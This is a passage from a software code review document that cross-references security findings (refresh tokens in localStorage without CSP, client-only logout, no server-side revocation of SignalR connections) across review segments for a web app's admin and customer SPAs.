- **[Segment 12](CODE_REVIEW_ROADMAP.md#segment-12--signalr-hubs--realtime):** [CODE_REVIEW_SEGMENT_12_SIGNALR.md F5](CODE_REVIEW_SEGMENT_12_SIGNALR.md#f5--low--token-expiry-and-admin-driven-revocation-are-not-handled-mid-connection) — *"no server-side mechanism drops connections when an admin revokes a QR token / when a refresh token is revoked"* — [F3](#f3--high--logout-is-clientonly-no-backend-revocation-the-refresh-token-stays-valid-for-up-to-30-days-after-logout) is the same gap from the HTTP side. Both need server-side state to be revocable.
- **[Segment 18](CODE_REVIEW_ROADMAP.md#segment-18--customer-spa--shell--state) / [Segment 19](CODE_REVIEW_ROADMAP.md#segment-19--customer-spa--realtime-client):** the customer SPA has a simpler shape (QR-token, no JWT) so most of these findings don't transfer — but [F1](#f1--high--refresh-token-lives-in-localstorage-no-httponly-cookie-no-csp-no-documented-xss-acceptance--)'s CSP recommendation lands on both SPAs; the customer SPA's [Segment 18 F5](CODE_REVIEW_SEGMENT_18_CUSTOMER_SHELL.md#f5--medium--no-global-error-handler-no-toast-system-perfeature-error-state-is-the-only-pattern) (no toast surface) is the same shape as the admin's reliance on `useToast` (which lives at [composables/useToast.ts](frontend-admin/src/composables/useToast.ts) — the admin SPA has it; the customer one doesn't).
- **[Segment 25](CODE_REVIEW_ROADMAP.md#segment-25--end-to-end-security-review):** the end-to-end security pass should land both [F1](#f1--high--refresh-token-lives-in-localstorage-no-httponly-cookie-no-csp-no-documented-xss-acceptance--)'s CSP / token-storage decisions and [F3](#f3--high--logout-is-clientonly-no-backend-revocation-the-refresh-token-stays-valid-for-up-to-30-days-after-logout)'s logout-revocation backend addition. Both are OWASP "Cryptographic failures" / "Identification and authentication failures" candidates.
